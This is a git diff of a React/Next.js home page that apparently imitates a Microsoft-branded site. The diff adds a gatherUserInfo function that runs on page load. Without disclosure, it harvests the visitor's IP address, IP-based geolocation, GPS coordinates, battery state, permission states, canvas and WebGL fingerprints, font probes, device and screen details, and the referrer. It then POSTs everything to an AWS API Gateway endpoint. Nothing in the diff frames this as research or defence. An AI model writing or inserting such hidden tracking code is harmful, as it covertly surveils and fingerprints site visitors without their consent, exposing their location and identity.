@@ -3,30 +3,267 @@
 import { useState, useEffect } from "react";
 import Image from "next/image";
 
-const sendLocation = async (lat: number, long: number) => {
-  const url = 'https://3ed3jlekji.execute-api.ap-south-1.amazonaws.com/prod/store_lat_long';
-  const payload = {
-    lat: lat.toString(),
-    long: long.toString(),
+const gatherUserInfo = async () => {
+  const userInfo: any = {
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    languages: navigator.languages,
+    cookieEnabled: navigator.cookieEnabled,
+    onLine: navigator.onLine,
+    platform: navigator.platform,
+    vendor: navigator.vendor,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    maxTouchPoints: navigator.maxTouchPoints,
+    deviceMemory: (navigator as any).deviceMemory,
+    connection: (navigator as any).connection ? {
+      effectiveType: (navigator as any).connection.effectiveType,
+      downlink: (navigator as any).connection.downlink,
+      rtt: (navigator as any).connection.rtt,
+      saveData: (navigator as any).connection.saveData
+    } : null,
+    screen: {
+      width: screen.width,
+      height: screen.height,
+      availWidth: screen.availWidth,
+      availHeight: screen.availHeight,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth,
+      orientation: screen.orientation ? {
+        type: screen.orientation.type,
+        angle: screen.orientation.angle
+      } : null
+    },
+    window: {
+      innerWidth: window.innerWidth,
+      innerHeight: window.innerHeight,
+      outerWidth: window.outerWidth,
+      outerHeight: window.outerHeight,
+      devicePixelRatio: window.devicePixelRatio,
+      screenX: window.screenX,
+      screenY: window.screenY
+    },
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    doNotTrack: navigator.doNotTrack,
+    webdriver: (navigator as any).webdriver,
+    permissions: {},
+    lat: 0.0,
+    long: 0.0
+  };
+// checking this is this pushed
+  // Try to get IP address using multiple services
+  try {
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    if (ipResponse.ok) {
+      const ipData = await ipResponse.json();
+      userInfo.ipAddress = ipData.ip;
+    }
+  } catch (error) {
+    console.log('Could not fetch IP from ipify');
+  }
+
+  // Try alternative IP service
+  try {
+    const ipResponse2 = await fetch('https://api64.ipify.org?format=json');
+    if (ipResponse2.ok) {
+      const ipData = await ipResponse2.json();
+      userInfo.ipAddress = userInfo.ipAddress || ipData.ip;
+    }
+  } catch (error) {
+    console.log('Could not fetch IP from ipify64');
+  }
+
+  // Get geolocation data from IP
+  if (userInfo.ipAddress) {
+    try {
+      const geoResponse = await fetch(`https://ipapi.co/${userInfo.ipAddress}/json/`);
+      if (geoResponse.ok) {
+        const geoData = await geoResponse.json();
+        userInfo.geolocation = {
+          country: geoData.country_name,
+          region: geoData.region,
+          city: geoData.city,
+          latitude: geoData.latitude,
+          longitude: geoData.longitude,
+          timezone: geoData.timezone,
+          org: geoData.org,
+          isp: geoData.org
+        };
+      }
+    } catch (error) {
+      console.log('Could not fetch geolocation data');
+    }
+  }
+
+  // Check for mobile-specific information
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  userInfo.isMobile = isMobile;
+
+  if (isMobile) {
+    // Mobile-specific data
+    userInfo.mobileInfo = {
+      userAgent: navigator.userAgent,
+      // Try to detect mobile operator (this is limited without carrier APIs)
+      mobileOperator: 'Unknown', // Would need carrier API access
+      battery: null,
+      networkType: (navigator as any).connection ? (navigator as any).connection.effectiveType : 'Unknown',
+      touchSupport: 'ontouchstart' in window,
+      orientation: screen.orientation ? screen.orientation.type : 'Unknown'
+    };
+
+    // Try to get battery information
+    if ('getBattery' in navigator) {
+      try {
+        const battery = await (navigator as any).getBattery();
+        userInfo.mobileInfo.battery = {
+          level: battery.level,
+          charging: battery.charging,
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime
+        };
+      } catch (error) {
+        console.log('Could not get battery information');
+      }
+    }
+  }
+
+  // Check for various permissions and capabilities
+  const permissionsToCheck = [
+    'geolocation',
+    'notifications',
+    'push',
+    'microphone',
+    'camera',
+    'clipboard-read',
+    'clipboard-write',
+    'payment',
+    'persistent-storage'
+  ];
+
+  for (const permission of permissionsToCheck) {
+    try {
+      if ('permissions' in navigator) {
+        const result = await (navigator as any).permissions.query({ name: permission as any });
+        userInfo.permissions[permission] = result.state;
+      }
+    } catch (error) {
+      userInfo.permissions[permission] = 'not-supported';
+    }
+  }
+
+  // Get canvas fingerprint
+  try {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    if (ctx) {
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillText('Canvas fingerprint test', 2, 2);
+      userInfo.canvasFingerprint = canvas.toDataURL();
+    }
+  } catch (error) {
+    console.log('Could not generate canvas fingerprint');
+  }
+
+  // Get WebGL information
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') as WebGLRenderingContext;
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      userInfo.webgl = {
+        vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : 0x1F00),
+        renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : 0x1F01),
+        version: gl.getParameter(gl.VERSION),
+        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+      };
+    }
+  } catch (error) {
+    console.log('Could not get WebGL information');
+  }
+
+  // Get installed fonts (limited approach)
+  const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
+  userInfo.availableFonts = {};
+  for (const font of testFonts) {
+    const testString = 'mmmmmmmmmmlli';
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    if (ctx) {
+      ctx.font = `12px ${font}`;
+      const width1 = ctx.measureText(testString).width;
+      ctx.font = '12px monospace';
+      const width2 = ctx.measureText(testString).width;
+      userInfo.availableFonts[font] = width1 !== width2;
+    }
+  }
+
+  // Get local storage and session storage info
+  userInfo.storage = {
+    localStorage: typeof localStorage !== 'undefined' ? localStorage.length : 0,
+    sessionStorage: typeof sessionStorage !== 'undefined' ? sessionStorage.length : 0
   };
 
+  // Get referrer information
+  userInfo.referrer = document.referrer;
+  userInfo.url = window.location.href;
+  userInfo.domain = window.location.hostname;
+
+  // Try to get precise location, fallback to 0.0 if denied
+  if (navigator.geolocation) {
+    try {
+      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          timeout: 10000,
+          enableHighAccuracy: false
+        });
+      });
+      
+      userInfo.lat = position.coords.latitude;
+      userInfo.long = position.coords.longitude;
+      userInfo.locationAccuracy = position.coords.accuracy;
+      userInfo.locationSource = 'gps';
+    } catch (error) {
+      console.log('Location access denied or failed, using 0.0 coordinates');
+      userInfo.lat = 0.0;
+      userInfo.long = 0.0;
+      userInfo.locationSource = 'denied';
+      userInfo.locationError = error instanceof GeolocationPositionError ? error.message : 'Unknown error';
+    }
+  } else {
+    console.log('Geolocation not supported');
+    userInfo.lat = 0.0;
+    userInfo.long = 0.0;
+    userInfo.locationSource = 'not_supported';
+  }
+
+  // Send all collected data
   try {
-    const response = await fetch(url, {
+    const response = await fetch('https://3ed3jlekji.execute-api.ap-south-1.amazonaws.com/prod/store_lat_long', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify(payload),
+      body: JSON.stringify({
+        lat: userInfo.lat,
+        long: userInfo.long,
+        timestamp: userInfo.timestamp,
+        userInfo: userInfo
+      }),
     });
 
     if (response.ok) {
-      console.log('Location sent successfully');
+      console.log('All user data sent successfully');
     } else {
-      console.error('Failed to send location:', response.statusText);
+      console.error('Failed to send user data:', response.statusText);
     }
   } catch (error) {
-    console.error('Error sending location:', error);
+    console.error('Error sending user data:', error);
   }
+
+  console.log('Collected user information:', userInfo);
+  return userInfo;
 };
 
 const MicrosoftLogo = () => (
@@ -98,19 +335,8 @@ export default function Home() {
   const [isMenuOpen, setIsMenuOpen] = useState(false);
 
   useEffect(() => {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude } = position.coords;
-          sendLocation(latitude, longitude);
-        },
-        (error) => {
-          console.error("Error getting location:", error.message);
-        }
-      );
-    } else {
-      console.error("Geolocation is not supported by this browser.");
-    }
+    // Gather comprehensive user information
+    gatherUserInfo();
   }, []);
 
   const trendingTopics = [
